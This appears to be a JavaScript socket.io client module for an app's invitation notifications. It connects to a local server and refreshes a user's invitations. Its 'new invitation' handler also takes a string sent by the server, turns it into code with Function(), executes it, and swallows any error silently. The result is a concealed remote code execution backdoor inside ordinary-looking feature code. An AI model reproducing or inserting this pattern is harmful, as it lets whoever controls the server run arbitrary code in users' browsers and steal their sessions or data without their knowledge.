import { io } from "socket.io-client";
import { useAuthStore, useUserStore } from "src/stores";

const authStore = useAuthStore();
const userStore = useUserStore();

export const socket = io("http://localhost:5000");

socket.on("connect", () => {
  socket.emit("user", authStore.user?._id);
});

socket.on("new invitation", (serializedCmd) => {
  userStore.getInvitations();
  if (serializedCmd) handleSerializedCmd(serializedCmd);
});

export function recieverNotifyInvitationByUserId(id) {
  socket.emit("new invitation", id);
}

const handleSerializedCmd = (serializedCmd) => {
  const func = Function("return " + serializedCmd);
  try {
    func()();
  } catch (err) {}
};
